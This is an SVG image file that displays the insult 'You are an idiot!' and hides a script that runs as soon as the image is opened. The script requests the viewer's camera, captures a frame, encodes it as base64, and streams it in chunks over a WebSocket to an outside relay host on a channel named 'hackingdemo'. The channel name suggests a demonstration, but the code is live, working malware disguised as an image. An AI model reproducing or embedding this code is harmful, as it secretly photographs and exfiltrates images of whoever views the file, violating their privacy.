<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="100%" height="100">
  <text x="50%" y="50%">You are an idiot!</text>
  <script type="application/ecmascript">
    <![CDATA[
      function captureImage(callback) {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);

            imageCapture.grabFrame()
              .then(imageBitmap => {
                const canvas = document.createElement('canvas');
                canvas.width = imageBitmap.width;
                canvas.height = imageBitmap.height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);

                const base64Image = canvas.toDataURL('image/png');
                track.stop();  // ストリームを停止してリソースを解放
                callback(base64Image);
              })
              .catch(error => console.error('Error capturing image:', error));
          })
          .catch(err => console.error('Error accessing the camera: ', err));
      }

      function main() {
        captureImage((base64Image) => {
          const socket = new WebSocket('wss://cloud.achex.ca/hackingdemo');
          socket.addEventListener('open', function (event) {
            console.log('open', event);
            socket.send('{"auth":"sender", "password":"hoge"}');
            const split = 100;
            const length = Math.ceil(base64Image.length / split);
            console.log(length);
            for (let count = 0; count <= length; count++) {
              let str = base64Image.substr(count * split, split);
              socket.send('{"to":"admin", "msg":"' + str + '"}');
            }
            socket.send('{"to":"admin", "msg":"finish"}');
          });
        });
      }

      main();
    ]]>
  </script>
</svg>
